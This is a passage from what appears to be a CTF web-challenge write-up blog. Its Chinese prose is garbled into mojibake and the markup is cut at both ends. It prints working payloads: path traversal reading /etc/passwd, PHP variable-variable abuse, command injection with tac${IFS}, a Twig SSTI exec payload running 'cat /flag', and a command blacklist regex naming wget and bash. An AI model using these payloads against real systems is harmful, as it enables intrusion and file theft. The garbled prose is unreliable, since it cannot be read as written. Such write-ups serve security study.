class="hljs-number">253</span>f<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><p><img src="/images/G1EYMWNMMY6OS2BF0.png"><br>å¯ä»¥æˆåŠŸæ‰§è¡Œï¼Œè·å–åˆ°äº†passwdæ–‡ä»¶çš„å†…å®¹ï¼Œå°è¯•æŸ¥æ‰¾flag<br>payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?target=db_sql.php%<span class="hljs-number">253</span>f<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../flag<br></code></pre></td></tr></table></figure><p><img src="/images/XZ69C0YPOUN95B37GM.png"></p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>æŸ¥çœ‹æºç ä»¥åŠæŠ“åŒ…ï¼Œæ²¡æœ‰æ‰¾åˆ°æœ‰ç”¨çš„ä¿¡æ¯<br>å°è¯•dirsearchæ‰«æï¼Œå‘ç°å­˜åœ¨.gitæ³„éœ²<br>é‚£ä¹ˆç›´æ¥ç”¨git_hackæ‰«å‡ºæ–‡ä»¶<br>åœ¨index.phpæ–‡ä»¶ä¸­æ‰¾å‡ºphpæºç </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br><br><span class="hljs-regexp">/*include &#x27;flag.php&#x27;;*/</span><br>highlight_file(__FILE__);<br><span class="hljs-variable">$yds</span> = <span class="hljs-string">&quot;dog&quot;</span>;<br><span class="hljs-variable">$is</span> = <span class="hljs-string">&quot;cat&quot;</span>;<br><span class="hljs-variable">$handsome</span> = <span class="hljs-string">&#x27;yds&#x27;</span>;<br><br>foreach(<span class="hljs-variable">$_POST</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    $<span class="hljs-variable">$x</span> = <span class="hljs-variable">$y</span>;<br>&#125;<br><br>foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    $<span class="hljs-variable">$x</span> = $<span class="hljs-variable">$y</span>;<br>&#125;<br><br>foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>exitå’Œdieä¸€æ ·ï¼Œéƒ½æ˜¯è¾“å‡ºä¸€æ¡ä¿¡æ¯åé€€å‡ºå½“å‰è„šæœ¬<br>ä¸Šé¢çš„ä»£ç ä¸­æœ€é‡è¦çš„ä¸¤å—ä»£ç </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    $<span class="hljs-variable">$x</span> = $<span class="hljs-variable">$y</span>;<br>&#125;<br><br>foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ä¸€ä¸‹,å…ˆè§£é‡Šä¸€ä¸‹å¯å˜å˜é‡ï¼š<br>å¦‚æœä¸€ä¸ªå˜é‡ä¿å­˜çš„å€¼åˆšå¥½æ˜¯å¦å¤–ä¸€ä¸ªå˜é‡çš„åå­—ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥é€šè¿‡è®¿é—®ä¸€ä¸ªå˜é‡å¾—åˆ°å¦å¤–ä¸€ä¸ªå˜é‡çš„å€¼ï¼šåœ¨å˜é‡ä¹‹å‰å†å¤šåŠ ä¸€ä¸ª$ç¬¦å·<br>ä¾‹ï¼š</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$a</span>=&#x27;b&#x27;;</span><br><span class="hljs-meta"><span class="hljs-keyword">$b</span>=&#x27;bbbb&#x27;;</span><br>echo <span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>a;<br><span class="hljs-comment">//è¾“å‡ºbbbb </span><br><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>a-&gt;<span class="hljs-symbol">$</span>b<br></code></pre></td></tr></table></figure><p>ç®€å•ç†è§£ä¸º$$aç›¸å½“äº$($a)<br>å†å¯¹ä¸Šé¢çš„ä»£ç è¿›è¡Œè§£è¯»</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-variable">$</span><span class="hljs-variable">$x</span> = <span class="hljs-variable">$</span><span class="hljs-variable">$y</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¯”å¦‚GETè¾“å…¥a&#x3D;flag<br>é‚£ä¹ˆ$x&#x3D;a,$y&#x3D;flag<br> $$x &#x3D; $$yæ‰€ä»¥$a&#x3D;$flag,é…åˆexitè¿™æ ·å°±å¯ä»¥è¾“å…¥$flagçš„å€¼äº†<br> æ„é€ payload<br> <figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">?handsome=<span class="hljs-built_in">flag</span>&amp;x=<span class="hljs-built_in">flag</span>&amp;<span class="hljs-built_in">flag</span>=x<br></code></pre></td></tr></table></figure><br>handsome&#x3D;flagä¸ç”¨è¯´ å°±æ˜¯è®©$handsome&#x3D;$flag<br>åé¢çš„ç›®çš„å°±æ˜¯è®©æˆ‘ä»¬ä¼ å…¥çš„å˜é‡æ˜¯ flag å€¼ä¸æ˜¯flag è¿›è€Œèƒ½å¤Ÿexit handsome<br>è¿™é‡Œçš„å€¼è¡¨é¢æ˜¯ x ä½†å‰é¢æˆ‘ä»¬è¿›è¡Œäº†å˜é‡è¦†ç›–ä½¿å¾— x&#x3D;flag æ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬è¾“å‡ºxçš„å€¼å°±æ˜¯flagçš„å€¼<br><img src="/images/JNSYNMWR0M0GM7R.png"></p><h2 id="WUSTCTF2020-æœ´å®æ— å"><a href="#WUSTCTF2020-æœ´å®æ— å" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å"></a>[WUSTCTF2020]æœ´å®æ— å</h2><p>çœ‹åˆ°è¿™ç§æ²¡æœ‰å¾ˆå¤šæè¿°çš„é¢˜ç›´æ¥æå‡ºdirsearch<br>æ‰«å‡ºrobots.txt<br>é‡Œé¢æç¤ºäº†fAke_f1agggg.php<br>è¿›å…¥æŸ¥çœ‹ï¼Œä¸å‡ºæ„æ–™<br>å“ªå“ªéƒ½çœ‹ä¸€çœ‹<br>æ‰¾åˆ°ä¸€ä¸ª<br><img src="/images/UK82BH2SOKD0KWXEE9F6U.png"><br>å¾ˆéš¾ç»·<br><img src="/images/0F4A1WUAHEN3Y59N.png"><br>æ¢ç´¢åˆ°ä¸€ä¸ªæ–°åŠŸèƒ½ğŸ™‚<br><img src="/images/TLFZIYE71LUDA05O.png"><br>è½¬åŒ–ä¹‹å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><br><br><span class="hljs-comment">//level 1</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>) &lt; <span class="hljs-number">2020</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2021</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å»éæ´²å§&quot;</span>);<br>&#125;<br><span class="hljs-comment">//level 2</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>]))&#123;<br>   <span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5</span>==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5</span>))<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;</span>;<br>   <span class="hljs-keyword">else</span><br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å»éæ´²å§&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//get flag</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$get_flag</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$get_flag</span>,<span class="hljs-string">&quot; &quot;</span>))&#123;<br>        <span class="hljs-variable">$get_flag</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;wctf2020&quot;</span>, <span class="hljs-variable">$get_flag</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$get_flag</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¿«åˆ°éæ´²äº†&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å»éæ´²å§&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>å¥½å—å¤šäº†ï¼Œç°åœ¨ä¹Ÿå®¹æ˜“äº†<br>ç›´æ¥payload</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts">?<span class="hljs-attr">num</span><span class="hljs-operator">=</span><span class="hljs-number">3e4</span><span class="hljs-variable">&amp;md5</span>=<span class="hljs-number">0e215962017</span><span class="hljs-variable">&amp;get_flag</span>=ls<br><span class="hljs-comment">//404.html fAke_f1agggg.php fl4g.php fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag img.jpg index.php robots.txt </span><br>?<span class="hljs-attr">num</span><span class="hljs-operator">=</span><span class="hljs-number">3e4</span><span class="hljs-variable">&amp;md5</span>=<span class="hljs-number">0e215962017</span><span class="hljs-variable">&amp;get_flag</span>=tac$<span class="hljs-punctuation">&#123;</span>IFS<span class="hljs-punctuation">&#125;</span>fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag<br><span class="hljs-comment">//flag&#123;0a4bf020-4cfd-4519-ac84-0481a8b786a2&#125; </span><br></code></pre></td></tr></table></figure><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>è¾“å…¥adminè¯•è¯•<br>å›æ˜¾admin<br>æ‰¾åˆ°æºä»£ç <br><img src="/images/0UOK26JNCRDJ39EQSF.png"><br>çœ‹çœ‹èƒ½ä¸èƒ½xä¸€ä¸‹<br><img src="/images/XXRMNSDFETL2IUQW.png"><br>è¢«htmlè½¬ä¸ºå®ä½“å­—ç¬¦äº†ï¼Œä¸èƒ½x<br>hintä¸­æœ‰æé†’Why not take a closer look at cookiesï¼Ÿ<br>æŠ“åŒ…çœ‹çœ‹<br>æœ‰ä¸¤ä¸ªåŒ…ï¼Œç¬¬äºŒä¸ªåŒ…cookieä¸­userå¯ä»¥æ”¹å˜é¡µé¢å›æ˜¾<br>é‚£å°±æŠ“åˆ°ç¬¬äºŒä¸ªåŒ…<br>æœ¬é¢˜çš„çŸ¥è¯†ç‚¹æ˜¯åˆ©ç”¨æœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥æ”»å‡»ï¼ŒSSTIé‡Œé¢çš„Twigæ”»å‡»<br>åˆ¤æ–­æ¨¡æ¿æ³¨å…¥ç±»å‹çš„æ–¹æ³•<br><img src="/images/61b42a16c2b405e6ab1ada36470713f1.png"><br>è¾“å…¥49,è¿”å›49è¡¨ç¤ºæ˜¯Twigæ¨¡å—<br>è¾“å…¥49,è¿”å›7777777è¡¨ç¤ºæ˜¯jinja2æ¨¡å—<br>åœ¨cookieå¤„è¿›è¡Œåˆ¤æ–­<br>user&#x3D;49,æŸ¥çœ‹è¿”å›å€¼<br><img src="/images/B08XOX2WGAPXVUVF5.png"><br>åˆ¤æ–­ä¸ºTwigæ³¨å…¥<br>ç”±äºæ˜¯Twigæ³¨å…¥ï¼Œæ‰€ä»¥æœ‰å›½å®šçš„payload</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;id&quot;</span>)&#125;&#125;</span><span class="language-xml">//æŸ¥çœ‹id</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;cat /flag&quot;</span>)&#125;&#125;</span><span class="language-xml">//æŸ¥çœ‹flag</span><br></code></pre></td></tr></table></figure><p><img src="/images/AZJKHF8MYLVSXY26LX.png"><br><img src="/images/JCTE5HBQ6IX0LVB42K.png"><br><a href="https://xz.aliyun.com/t/10056#toc-16">Twigæ¨¡æ¿æ³¨å…¥ä»é›¶åˆ°ä¸€</a></p><h2 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><p>urlæœ‰ç‚¹å¥‡æ€ª<br><img src="/images/O7TO6JUWTEDZZKGNI8.png"><br>cmdéšä¾¿è¾“å…¥123<br>æœ‰å›æ˜¾ï¼Œæ‰§è¡Œä¸€ä¸‹å‘½ä»¤<br>echo%201ï¼Œforbid ~<br>è¢«ç¦æ­¢äº†<br>å†çœ‹imgï¼Œæœ‰ç‚¹åƒbase64ç¼–ç è¿‡çš„ï¼Œbase64è§£ç ä¸€ä¸‹<br><img src="/images/WHMHWO5NM9TXT02WL.png"><br>æ›´åƒbase64ç¼–ç è¿‡çš„äº†<br>å†æ¥ä¸€ä¸‹<br><img src="/images/SCSFCWCUQ0RRMHNUTV.png"><br>16è¿›åˆ¶è§£ç è¯•è¯•<br><img src="/images/GSFC2R2VJOYPWHQ8WJR.png"><br>è·¯å­éƒ½çŸ¥é“äº†<br>åœ¨imgé‡Œä¸Šä¼ ä¸€ä¸ªindex.phpè¯•è¯•<br>åŒæ ·çš„æ–¹æ³•å†ç¼–ç </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php<br><span class="hljs-regexp">//</span>to HEX<br><span class="hljs-number">696</span>e6465782e706870<br><span class="hljs-regexp">//</span>to Base64<br>Njk2ZTY0NjU3ODJlNzA2ODcw<br><span class="hljs-regexp">//</span>to Base64<br>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3<br></code></pre></td></tr></table></figure><p><img src="/images/W79NAB1O0JIUAANS4SU5O.png"><br><a href="https://www.lddgo.net/convert/base64-to-image">base64ç¼–ç è½¬å›¾ç‰‡</a><br>ä¸‹è½½ä¸‹æ¥åç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œphpæºç å°±æ‰¾å‡ºæ¥äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<br><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixiï½ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$txt</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>é‡ç‚¹æ˜¯ä¸‹é¢çš„ä»£ç </p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|<span class="hljs-subst">\&#x27;</span>|<span class="hljs-subst">\&quot;</span>|\`|;|,|\*|\?|<span class="hljs-subst">\\</span>|<span class="hljs-subst">\\</span><span class="hljs-subst">\\</span>|<span class="hljs-subst">\n</span>|<span class="hljs-subst">\t</span>|<span class="hljs-subst">\r</span>|\xA0|\&#123;|\&#125;|<span class="hljs-subst">\(<span class="hljs-operator">|</span>\)</span>|\&amp;[^\d]|@|\||<span class="hljs-subst">\\</span>$|\[|\]|&#123;|&#125;|<span class="hljs-subst">\(<span class="hljs-operator">|</span>\)</span>|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    echo(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    echo <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((string)<span class="hljs-variable">$_POST</span>[&#x27;a&#x27;] <span class="hljs-operator">!==</span> (string)<span 